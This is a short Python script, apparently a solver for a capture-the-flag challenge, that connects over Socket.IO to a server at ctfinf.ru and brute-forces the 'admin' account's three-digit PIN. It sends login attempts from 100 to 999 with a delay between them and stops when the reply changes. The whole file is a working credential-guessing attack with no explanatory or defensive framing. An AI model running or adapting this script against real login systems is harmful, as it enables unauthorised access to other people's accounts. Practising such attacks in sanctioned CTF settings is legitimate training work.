import socketio
import time

# Создаем клиент Socket.IO
sio = socketio.Client()

found_pin = None


@sio.event
def connect():
    print("Connected to server")


@sio.event
def disconnect():
    print("Disconnected from server")


@sio.on('login_result')
def on_login_result(data):
    global found_pin
    print(f"PIN: {current_pin} - {data.get('message')}")

    if data.get('message') != "Неправильный PIN":
        print(f"Possible correct PIN: {current_pin}")
        found_pin = current_pin
        sio.disconnect()


def attempt_login(pin):
    global current_pin
    current_pin = pin
    sio.emit('login_attempt', {'username': 'admin', 'pin': str(pin)})


def login_with_delay(start, end, delay):
    try:
        sio.connect('http://ctfinf.ru:10013')

        current = start
        while current <= end and found_pin is None:
            attempt_login(current)
            current += 1
            time.sleep(delay / 1000)  # Convert ms to seconds

        if found_pin:
            print(f"Found PIN: {found_pin}")
        else:
            print("PIN not found in range")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        sio.disconnect()


# Использование
if __name__ == "__main__":
    login_with_delay(100, 999, 500)  # от 100 до 999 с задержкой 500ms